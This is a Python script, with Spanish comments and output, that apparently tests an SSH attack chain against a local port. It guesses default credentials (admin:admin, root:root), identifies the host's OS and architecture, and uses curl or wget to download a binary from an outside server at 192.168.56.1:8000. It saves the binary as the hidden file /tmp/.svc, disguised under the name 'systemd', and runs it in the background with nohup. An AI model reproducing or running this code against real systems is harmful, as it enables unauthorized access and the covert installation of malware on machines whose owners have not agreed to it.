import paramiko
import sys

print("=" * 50)
print("TEST DE CONEXION SSH Y DESCARGA DE BINARIO")
print("=" * 50)

target_ip = '127.0.0.1'
target_port = 2201
binary_server = 'http://192.168.56.1:8000'

# Probar credenciales
creds = [('admin', 'admin'), ('root', 'root')]

for user, pwd in creds:
    try:
        print(f"\n[*] Probando {user}:{pwd} en {target_ip}:{target_port}...")
        
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target_ip, port=target_port, username=user, password=pwd, timeout=10)
        
        print(f"[+] ✓ Conexión SSH exitosa!")
        
        # Detectar sistema
        stdin, stdout, stderr = client.exec_command('uname -s', timeout=5)
        os_type = stdout.read().decode('utf-8').strip().lower()
        print(f"[+] Sistema operativo: {os_type}")
        
        stdin, stdout, stderr = client.exec_command('uname -m', timeout=5)
        arch = stdout.read().decode('utf-8').strip()
        print(f"[+] Arquitectura: {arch}")
        
        # Verificar herramientas disponibles
        stdin, stdout, stderr = client.exec_command('which curl wget', timeout=5)
        tools = stdout.read().decode('utf-8').strip()
        print(f"[+] Herramientas disponibles:\n{tools}")
        
        # Intentar descargar binario
        print(f"\n[*] Intentando descargar binario desde {binary_server}/systemd...")
        
        download_cmd = f"""
cd /tmp
rm -f .svc 2>/dev/null
curl -v -f -o .svc {binary_server}/systemd 2>&1 || wget -v -O .svc {binary_server}/systemd 2>&1
if [ -f .svc ]; then
    ls -lh .svc
    file .svc
    echo "DESCARGA_EXITOSA"
else
    echo "DESCARGA_FALLIDA"
fi
"""
        
        stdin, stdout, stderr = client.exec_command(download_cmd, timeout=30)
        result = stdout.read().decode('utf-8')
        error = stderr.read().decode('utf-8')
        
        print(f"\n[STDOUT]:\n{result}")
        if error:
            print(f"\n[STDERR]:\n{error}")
        
        # Intentar ejecutar
        if "DESCARGA_EXITOSA" in result:
            print(f"\n[*] Intentando ejecutar binario...")
            
            exec_cmd = """
cd /tmp
chmod +x .svc
nohup ./.svc > /tmp/.svc.log 2>&1 &
sleep 2
ps aux | grep "[.]svc"
if ps aux | grep -q "[.]svc"; then
    echo "EJECUCION_EXITOSA"
else
    echo "EJECUCION_FALLIDA"
    cat /tmp/.svc.log
fi
"""
            
            stdin, stdout, stderr = client.exec_command(exec_cmd, timeout=10)
            exec_result = stdout.read().decode('utf-8')
            print(f"\n[RESULTADO EJECUCIÓN]:\n{exec_result}")
        
        client.close()
        print(f"\n[+] ✓ PRUEBA COMPLETADA")
        sys.exit(0)
        
    except paramiko.AuthenticationException:
        print(f"[-] Credenciales incorrectas")
        continue
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
        continue

print("\n[!] No se pudo conectar con ninguna credencial")
